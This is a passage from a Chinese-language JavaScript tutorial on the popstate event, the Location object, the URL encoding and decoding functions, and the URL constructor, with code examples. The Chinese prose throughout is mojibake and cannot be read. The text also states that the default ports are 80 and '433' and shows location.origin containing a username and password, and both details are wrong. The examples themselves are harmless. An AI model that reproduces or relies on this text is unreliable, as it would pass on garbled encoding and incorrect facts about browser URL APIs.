history<span class="token punctuation">.</span><span class="token function">go</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token comment">// URL æ˜¾ç¤ºä¸º http://example.com/example.html?page=3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h2 id="_4-popstate-äº‹ä»¶"><a href="#_4-popstate-äº‹ä»¶" class="header-anchor">#</a> 4.popstate äº‹ä»¶</h2> <p>æ¯å½“åŒä¸€ä¸ªæ–‡æ¡£çš„æµè§ˆå†å²ï¼ˆå³<code>history</code>å¯¹è±¡ï¼‰å‡ºç°å˜åŒ–æ—¶ï¼Œå°±ä¼šè§¦å‘<code>popstate</code>äº‹ä»¶ã€‚</p> <p>æ³¨æ„ï¼Œä»…ä»…è°ƒç”¨<code>pushState()</code>æ–¹æ³•æˆ–<code>replaceState()</code>æ–¹æ³• ï¼Œå¹¶ä¸ä¼šè§¦å‘è¯¥äº‹ä»¶ï¼Œåªæœ‰ç”¨æˆ·ç‚¹å‡»æµè§ˆå™¨å€’é€€æŒ‰é’®å’Œå‰è¿›æŒ‰é’®ï¼Œæˆ–è€…ä½¿ç”¨ JavaScript è°ƒç”¨<code>History.back()</code>ã€<code>History.forward()</code>ã€<code>History.go()</code>æ–¹æ³•æ—¶æ‰ä¼šè§¦å‘ã€‚å¦å¤–ï¼Œè¯¥äº‹ä»¶åªé’ˆå¯¹åŒä¸€ä¸ªæ–‡æ¡£ï¼Œå¦‚æœæµè§ˆå†å²çš„åˆ‡æ¢ï¼Œå¯¼è‡´åŠ è½½ä¸åŒçš„æ–‡æ¡£ï¼Œè¯¥äº‹ä»¶ä¹Ÿä¸ä¼šè§¦å‘ã€‚</p> <p>ä½¿ç”¨çš„æ—¶å€™ï¼Œå¯ä»¥ä¸º<code>popstate</code>äº‹ä»¶æŒ‡å®šå›è°ƒå‡½æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onpopstate</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'location: '</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'state: '</span> <span class="token operator">+</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>state<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// æˆ–è€…</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'popstate'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'location: '</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'state: '</span> <span class="token operator">+</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>state<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>å›è°ƒå‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ª<code>event</code>äº‹ä»¶å¯¹è±¡ï¼Œå®ƒçš„<code>state</code>å±æ€§æŒ‡å‘<code>pushState</code>å’Œ<code>replaceState</code>æ–¹æ³•ä¸ºå½“å‰ URL æ‰€æä¾›çš„çŠ¶æ€å¯¹è±¡ï¼ˆå³è¿™ä¸¤ä¸ªæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼‰ã€‚ä¸Šé¢ä»£ç ä¸­çš„<code>event.state</code>ï¼Œå°±æ˜¯é€šè¿‡<code>pushState</code>å’Œ<code>replaceState</code>æ–¹æ³•ï¼Œä¸ºå½“å‰ URL ç»‘å®šçš„<code>state</code>å¯¹è±¡ã€‚</p> <p>è¿™ä¸ª<code>state</code>å¯¹è±¡ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡<code>history</code>å¯¹è±¡è¯»å–ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> currentState <span class="token operator">=</span> history<span class="token punctuation">.</span>state<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æ³¨æ„ï¼Œé¡µé¢ç¬¬ä¸€æ¬¡åŠ è½½çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¸ä¼šè§¦å‘<code>popstate</code>äº‹ä»¶ã€‚</p> <h2 id="ä¹ã€location-å¯¹è±¡ï¼Œurl-å¯¹è±¡ï¼Œurlsearchparams-å¯¹è±¡"><a href="#ä¹ã€location-å¯¹è±¡ï¼Œurl-å¯¹è±¡ï¼Œurlsearchparams-å¯¹è±¡" class="header-anchor">#</a> ä¹ã€Location å¯¹è±¡ï¼ŒURL å¯¹è±¡ï¼ŒURLSearchParams å¯¹è±¡</h2> <p>URL æ˜¯äº’è”ç½‘çš„åŸºç¡€è®¾æ–½ä¹‹ä¸€ã€‚æµè§ˆå™¨æä¾›äº†ä¸€äº›åŸç”Ÿå¯¹è±¡ï¼Œç”¨æ¥ç®¡ç† URLã€‚</p> <h2 id="_1-location-å¯¹è±¡"><a href="#_1-location-å¯¹è±¡" class="header-anchor">#</a> 1.Location å¯¹è±¡</h2> <p><code>Location</code>å¯¹è±¡æ˜¯æµè§ˆå™¨æä¾›çš„åŸç”Ÿå¯¹è±¡ï¼Œæä¾› URL ç›¸å…³çš„ä¿¡æ¯å’Œæ“ä½œæ–¹æ³•ã€‚é€šè¿‡<code>window.location</code>å’Œ<code>document.location</code>å±æ€§ï¼Œå¯ä»¥æ‹¿åˆ°è¿™ä¸ªå¯¹è±¡ã€‚</p> <h3 id="å±æ€§"><a href="#å±æ€§" class="header-anchor">#</a> å±æ€§</h3> <p><code>Location</code>å¯¹è±¡æä¾›ä»¥ä¸‹å±æ€§ã€‚</p> <ul><li><code>Location.href</code>ï¼šæ•´ä¸ª URLã€‚</li> <li><code>Location.protocol</code>ï¼šå½“å‰ URL çš„åè®®ï¼ŒåŒ…æ‹¬å†’å·ï¼ˆ<code>:</code>ï¼‰ã€‚</li> <li><code>Location.host</code>ï¼šä¸»æœºã€‚å¦‚æœç«¯å£ä¸æ˜¯åè®®é»˜è®¤çš„<code>80</code>å’Œ<code>433</code>ï¼Œåˆ™è¿˜ä¼šåŒ…æ‹¬å†’å·ï¼ˆ<code>:</code>ï¼‰å’Œç«¯å£ã€‚</li> <li><code>Location.hostname</code>ï¼šä¸»æœºåï¼Œä¸åŒ…æ‹¬ç«¯å£ã€‚</li> <li><code>Location.port</code>ï¼šç«¯å£å·ã€‚</li> <li><code>Location.pathname</code>ï¼šURL çš„è·¯å¾„éƒ¨åˆ†ï¼Œä»æ ¹è·¯å¾„<code>/</code>å¼€å§‹ã€‚</li> <li><code>Location.search</code>ï¼šæŸ¥è¯¢å­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œä»é—®å·<code>?</code>å¼€å§‹ã€‚</li> <li><code>Location.hash</code>ï¼šç‰‡æ®µå­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œä»<code>#</code>å¼€å§‹ã€‚</li> <li><code>Location.username</code>ï¼šåŸŸåå‰é¢çš„ç”¨æˆ·åã€‚</li> <li><code>Location.password</code>ï¼šåŸŸåå‰é¢çš„å¯†ç ã€‚</li> <li><code>Location.origin</code>ï¼šURL çš„åè®®ã€ä¸»æœºåå’Œç«¯å£ã€‚</li></ul> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// å½“å‰ç½‘å€ä¸º</span>
<span class="token comment">// http://user:passwd@www.example.com:4097/path/a.html?x=111#part1</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href
<span class="token comment">// &quot;http://user:passwd@www.example.com:4097/path/a.html?x=111#part1&quot;</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>protocol
<span class="token comment">// &quot;http:&quot;</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>host
<span class="token comment">// &quot;www.example.com:4097&quot;</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hostname
<span class="token comment">// &quot;www.example.com&quot;</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>port
<span class="token comment">// &quot;4097&quot;</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>pathname
<span class="token comment">// &quot;/path/a.html&quot;</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search
<span class="token comment">// &quot;?x=111&quot;</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash
<span class="token comment">// &quot;#part1&quot;</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>username
<span class="token comment">// &quot;user&quot;</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>password
<span class="token comment">// &quot;passwd&quot;</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>origin
<span class="token comment">// &quot;http://user:passwd@www.example.com:4097&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>è¿™äº›å±æ€§é‡Œé¢ï¼Œåªæœ‰<code>origin</code>å±æ€§æ˜¯åªè¯»çš„ï¼Œå…¶ä»–å±æ€§éƒ½å¯å†™ã€‚</p> <p>æ³¨æ„ï¼Œå¦‚æœå¯¹<code>Location.href</code>å†™å…¥æ–°çš„ URL åœ°å€ï¼Œæµè§ˆå™¨ä¼šç«‹åˆ»è·³è½¬åˆ°è¿™ä¸ªæ–°åœ°å€ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// è·³è½¬åˆ°æ–°ç½‘å€</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'http://www.example.com'</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>è¿™ä¸ªç‰¹æ€§å¸¸å¸¸ç”¨äºè®©ç½‘é¡µè‡ªåŠ¨æ»šåŠ¨åˆ°æ–°çš„é”šç‚¹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'#top'</span><span class="token punctuation">;</span>
<span class="token comment">// ç­‰åŒäº</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> <span class="token string">'#top'</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ç›´æ¥æ”¹å†™<code>location</code>ï¼Œç›¸å½“äºå†™å…¥<code>href</code>å±æ€§ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'http://www.example.com'</span><span class="token punctuation">;</span>
<span class="token comment">// ç­‰åŒäº</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'http://www.example.com'</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>å¦å¤–ï¼Œ<code>Location.href</code>å±æ€§æ˜¯æµè§ˆå™¨å”¯ä¸€å…è®¸è·¨åŸŸå†™å…¥çš„å±æ€§ï¼Œå³éåŒæºçš„çª—å£å¯ä»¥æ”¹å†™å¦ä¸€ä¸ªçª—å£ï¼ˆæ¯”å¦‚å­çª—å£ä¸çˆ¶çª—å£ï¼‰çš„<code>Location.href</code>å±æ€§ï¼Œå¯¼è‡´åè€…çš„ç½‘å€è·³è½¬ã€‚<code>Location</code>çš„å…¶ä»–å±æ€§éƒ½ä¸å…è®¸è·¨åŸŸå†™å…¥ã€‚</p> <h3 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="header-anchor">#</a> æ–¹æ³•</h3> <p><strong>ï¼ˆ1ï¼‰Location.assign()</strong></p> <p><code>assign</code>æ–¹æ³•æ¥å—ä¸€ä¸ª URL å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œä½¿å¾—æµè§ˆå™¨ç«‹åˆ»è·³è½¬åˆ°æ–°çš„ URLã€‚å¦‚æœå‚æ•°ä¸æ˜¯æœ‰æ•ˆçš„ URL å­—ç¬¦ä¸²ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// è·³è½¬åˆ°æ–°çš„ç½‘å€</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string">'http://www.example.com'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><strong>ï¼ˆ2ï¼‰Location.replace()</strong></p> <p><code>replace</code>æ–¹æ³•æ¥å—ä¸€ä¸ª URL å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œä½¿å¾—æµè§ˆå™¨ç«‹åˆ»è·³è½¬åˆ°æ–°çš„ URLã€‚å¦‚æœå‚æ•°ä¸æ˜¯æœ‰æ•ˆçš„ URL å­—ç¬¦ä¸²ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚</p> <p>å®ƒä¸<code>assign</code>æ–¹æ³•çš„å·®å¼‚åœ¨äºï¼Œ<code>replace</code>ä¼šåœ¨æµè§ˆå™¨çš„æµè§ˆå†å²<code>History</code>é‡Œé¢åˆ é™¤å½“å‰ç½‘å€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦ä½¿ç”¨äº†è¯¥æ–¹æ³•ï¼Œåé€€æŒ‰é’®å°±æ— æ³•å›åˆ°å½“å‰ç½‘é¡µäº†ï¼Œç›¸å½“äºåœ¨æµè§ˆå†å²é‡Œé¢ï¼Œä½¿ç”¨æ–°çš„ URL æ›¿æ¢äº†è€çš„ URLã€‚å®ƒçš„ä¸€ä¸ªåº”ç”¨æ˜¯ï¼Œå½“è„šæœ¬å‘ç°å½“å‰æ˜¯ç§»åŠ¨è®¾å¤‡æ—¶ï¼Œå°±ç«‹åˆ»è·³è½¬åˆ°ç§»åŠ¨ç‰ˆç½‘é¡µã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// è·³è½¬åˆ°æ–°çš„ç½‘å€</span>
document<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'http://www.example.com'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><strong>ï¼ˆ3ï¼‰Location.reload()</strong></p> <p><code>reload</code>æ–¹æ³•ä½¿å¾—æµè§ˆå™¨é‡æ–°åŠ è½½å½“å‰ç½‘å€ï¼Œç›¸å½“äºæŒ‰ä¸‹æµè§ˆå™¨çš„åˆ·æ–°æŒ‰é’®ã€‚</p> <p>å®ƒæ¥å—ä¸€ä¸ªå¸ƒå°”å€¼ä½œä¸ºå‚æ•°ã€‚å¦‚æœå‚æ•°ä¸º<code>true</code>ï¼Œæµè§ˆå™¨å°†å‘æœåŠ¡å™¨é‡æ–°è¯·æ±‚è¿™ä¸ªç½‘é¡µï¼Œå¹¶ä¸”é‡æ–°åŠ è½½åï¼Œç½‘é¡µå°†æ»šåŠ¨åˆ°å¤´éƒ¨ï¼ˆå³<code>scrollTop === 0</code>ï¼‰ã€‚å¦‚æœå‚æ•°æ˜¯<code>false</code>æˆ–ä¸ºç©ºï¼Œæµè§ˆå™¨å°†ä»æœ¬åœ°ç¼“å­˜é‡æ–°åŠ è½½è¯¥ç½‘é¡µï¼Œå¹¶ä¸”é‡æ–°åŠ è½½åï¼Œç½‘é¡µçš„è§†å£ä½ç½®æ˜¯é‡æ–°åŠ è½½å‰çš„ä½ç½®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// å‘æœåŠ¡å™¨é‡æ–°è¯·æ±‚å½“å‰ç½‘å€</span>
window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><strong>ï¼ˆ4ï¼‰Location.toString()</strong></p> <p><code>toString</code>æ–¹æ³•è¿”å›æ•´ä¸ª URL å­—ç¬¦ä¸²ï¼Œç›¸å½“äºè¯»å–<code>Location.href</code>å±æ€§ã€‚</p> <h2 id="_2-url-çš„ç¼–ç å’Œè§£ç "><a href="#_2-url-çš„ç¼–ç å’Œè§£ç " class="header-anchor">#</a> 2.URL çš„ç¼–ç å’Œè§£ç </h2> <p>ç½‘é¡µçš„ URL åªèƒ½åŒ…å«åˆæ³•çš„å­—ç¬¦ã€‚åˆæ³•å­—ç¬¦åˆ†æˆä¸¤ç±»ã€‚</p> <ul><li>URL å…ƒå­—ç¬¦ï¼šåˆ†å·ï¼ˆ<code>;</code>ï¼‰ï¼Œé€—å·ï¼ˆ<code>,</code>ï¼‰ï¼Œæ–œæ ï¼ˆ<code>/</code>ï¼‰ï¼Œé—®å·ï¼ˆ<code>?</code>ï¼‰ï¼Œå†’å·ï¼ˆ<code>:</code>ï¼‰ï¼Œatï¼ˆ<code>@</code>ï¼‰ï¼Œ<code>&amp;</code>ï¼Œç­‰å·ï¼ˆ<code>=</code>ï¼‰ï¼ŒåŠ å·ï¼ˆ<code>+</code>ï¼‰ï¼Œç¾å…ƒç¬¦å·ï¼ˆ<code>$</code>ï¼‰ï¼Œäº•å·ï¼ˆ<code>#</code>ï¼‰</li> <li>è¯­ä¹‰å­—ç¬¦ï¼š<code>a-z</code>ï¼Œ<code>A-Z</code>ï¼Œ<code>0-9</code>ï¼Œè¿è¯å·ï¼ˆ<code>-</code>ï¼‰ï¼Œä¸‹åˆ’çº¿ï¼ˆ<code>_</code>ï¼‰ï¼Œç‚¹ï¼ˆ<code>.</code>ï¼‰ï¼Œæ„Ÿå¹å·ï¼ˆ<code>!</code>ï¼‰ï¼Œæ³¢æµªçº¿ï¼ˆ<code>~</code>ï¼‰ï¼Œæ˜Ÿå·ï¼ˆ<code>*</code>ï¼‰ï¼Œå•å¼•å·ï¼ˆ<code>'</code>ï¼‰ï¼Œåœ†æ‹¬å·ï¼ˆ<code>()</code>ï¼‰</li></ul> <p>é™¤äº†ä»¥ä¸Šå­—ç¬¦ï¼Œå…¶ä»–å­—ç¬¦å‡ºç°åœ¨ URL ä¹‹ä¸­éƒ½å¿…é¡»è½¬ä¹‰ï¼Œè§„åˆ™æ˜¯æ ¹æ®æ“ä½œç³»ç»Ÿçš„é»˜è®¤ç¼–ç ï¼Œå°†æ¯ä¸ªå­—èŠ‚è½¬ä¸ºç™¾åˆ†å·ï¼ˆ<code>%</code>ï¼‰åŠ ä¸Šä¸¤ä¸ªå¤§å†™çš„åå…­è¿›åˆ¶å­—æ¯ã€‚</p> <p>æ¯”å¦‚ï¼ŒUTF-8 çš„æ“ä½œç³»ç»Ÿä¸Šï¼Œ<code>http://www.example.com/q=æ˜¥èŠ‚</code>è¿™ä¸ª URL ä¹‹ä¸­ï¼Œæ±‰å­—â€œæ˜¥èŠ‚â€ä¸æ˜¯ URL çš„åˆæ³•å­—ç¬¦ï¼Œæ‰€ä»¥è¢«æµè§ˆå™¨è‡ªåŠ¨è½¬æˆ<code>http://www.example.com/q=%E6%98%A5%E8%8A%82</code>ã€‚å…¶ä¸­ï¼Œâ€œæ˜¥â€è½¬æˆäº†<code>%E6%98%A5</code>ï¼Œâ€œèŠ‚â€è½¬æˆäº†<code>%E8%8A%82</code>ã€‚è¿™æ˜¯å› ä¸ºâ€œæ˜¥â€å’Œâ€œèŠ‚â€çš„ UTF-8 ç¼–ç åˆ†åˆ«æ˜¯<code>E6 98 A5</code>å’Œ<code>E8 8A 82</code>ï¼Œå°†æ¯ä¸ªå­—èŠ‚å‰é¢åŠ ä¸Šç™¾åˆ†å·ï¼Œå°±æ„æˆäº† URL ç¼–ç ã€‚</p> <p>JavaScript æä¾›å››ä¸ª URL çš„ç¼–ç /è§£ç æ–¹æ³•ã€‚</p> <ul><li><code>encodeURI()</code></li> <li><code>encodeURIComponent()</code></li> <li><code>decodeURI()</code></li> <li><code>decodeURIComponent()</code></li></ul> <h3 id="encodeuri"><a href="#encodeuri" class="header-anchor">#</a> encodeURI()</h3> <p><code>encodeURI()</code>æ–¹æ³•ç”¨äºè½¬ç æ•´ä¸ª URLã€‚å®ƒçš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»£è¡¨æ•´ä¸ª URLã€‚å®ƒä¼šå°†å…ƒå­—ç¬¦å’Œè¯­ä¹‰å­—ç¬¦ä¹‹å¤–çš„å­—ç¬¦ï¼Œéƒ½è¿›è¡Œè½¬ä¹‰ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token function">encodeURI</span><span class="token punctuation">(</span><span class="token string">'http://www.example.com/q=æ˜¥èŠ‚'</span><span class="token punctuation">)</span>
<span class="token comment">// &quot;http://www.example.com/q=%E6%98%A5%E8%8A%82&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="encodeuricomponent"><a href="#encodeuricomponent" class="header-anchor">#</a> encodeURIComponent()</h3> <p><code>encodeURIComponent()</code>æ–¹æ³•ç”¨äºè½¬ç  URL çš„ç»„æˆéƒ¨åˆ†ï¼Œä¼šè½¬ç é™¤äº†è¯­ä¹‰å­—ç¬¦ä¹‹å¤–çš„æ‰€æœ‰å­—ç¬¦ï¼Œå³å…ƒå­—ç¬¦ä¹Ÿä¼šè¢«è½¬ç ã€‚æ‰€ä»¥ï¼Œå®ƒä¸èƒ½ç”¨äºè½¬ç æ•´ä¸ª URLã€‚å®ƒæ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯ URL çš„ç‰‡æ®µã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token string">'æ˜¥èŠ‚'</span><span class="token punctuation">)</span>
<span class="token comment">// &quot;%E6%98%A5%E8%8A%82&quot;</span>
<span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token string">'http://www.example.com/q=æ˜¥èŠ‚'</span><span class="token punctuation">)</span>
<span class="token comment">// &quot;http%3A%2F%2Fwww.example.com%2Fq%3D%E6%98%A5%E8%8A%82&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>encodeURIComponent()</code>ä¼šè¿ URL å…ƒå­—ç¬¦ä¸€èµ·è½¬ä¹‰ï¼Œæ‰€ä»¥å¦‚æœè½¬ç æ•´ä¸ª URL å°±ä¼šå‡ºé”™ã€‚</p> <h3 id="decodeuri"><a href="#decodeuri" class="header-anchor">#</a> decodeURI()</h3> <p><code>decodeURI()</code>æ–¹æ³•ç”¨äºæ•´ä¸ª URL çš„è§£ç ã€‚å®ƒæ˜¯<code>encodeURI()</code>æ–¹æ³•çš„é€†è¿ç®—ã€‚å®ƒæ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯è½¬ç åçš„ URLã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token function">decodeURI</span><span class="token punctuation">(</span><span class="token string">'http://www.example.com/q=%E6%98%A5%E8%8A%82'</span><span class="token punctuation">)</span>
<span class="token comment">// &quot;http://www.example.com/q=æ˜¥èŠ‚&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="decodeuricomponent"><a href="#decodeuricomponent" class="header-anchor">#</a> decodeURIComponent()</h3> <p><code>decodeURIComponent()</code>ç”¨äºURL ç‰‡æ®µçš„è§£ç ã€‚å®ƒæ˜¯<code>encodeURIComponent()</code>æ–¹æ³•çš„é€†è¿ç®—ã€‚å®ƒæ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯è½¬ç åçš„ URL ç‰‡æ®µã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token function">decodeURIComponent</span><span class="token punctuation">(</span><span class="token string">'%E6%98%A5%E8%8A%82'</span><span class="token punctuation">)</span>
<span class="token comment">// &quot;æ˜¥èŠ‚&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="_3-url-æ¥å£"><a href="#_3-url-æ¥å£" class="header-anchor">#</a> 3.URL æ¥å£</h2> <p><code>URL</code>æ¥å£æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œæµè§ˆå™¨åŸç”Ÿæä¾›ï¼Œå¯ä»¥ç”¨æ¥æ„é€ ã€è§£æå’Œç¼–ç  URLã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œé€šè¿‡<code>window.URL</code>å¯ä»¥æ‹¿åˆ°è¿™ä¸ªæ„é€ å‡½æ•°ã€‚</p> <h3 id="æ„é€ å‡½æ•°"><a href="#æ„é€ å‡½æ•°" class="header-anchor">#</a> æ„é€ å‡½æ•°</h3> <p><code>URL</code>ä½œä¸ºæ„é€ å‡½æ•°ï¼Œå¯ä»¥ç”Ÿæˆ URL å®ä¾‹ã€‚å®ƒæ¥å—ä¸€ä¸ªè¡¨ç¤º URL çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ã€‚å¦‚æœå‚æ•°ä¸æ˜¯åˆæ³•çš„ URLï¼Œä¼šæŠ¥é”™ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">'http://www.example.com/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
url<span class="token punctuation">.</span>href
<span class="token comment">// &quot;http://www.example.com/index.html&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>å¦‚æœå‚æ•°æ˜¯å¦ä¸€ä¸ª URL å®ä¾‹ï¼Œæ„é€ å‡½æ•°ä¼šè‡ªåŠ¨è¯»å–è¯¥å®ä¾‹çš„<code>href</code>å±æ€§ï¼Œä½œä¸ºå®é™…å‚æ•°ã€‚</p> <p>å¦‚æœ URL å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼Œé‚£ä¹ˆéœ€è¦è¡¨ç¤ºç»å¯¹è·¯å¾„çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä½œä¸ºè®¡ç®—åŸºå‡†ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> url1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token string">'http://example.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
url1<span class="token punctuation">.</span>href
<span class="token comment">// &quot;http://example.com/index.html&quot;</span>

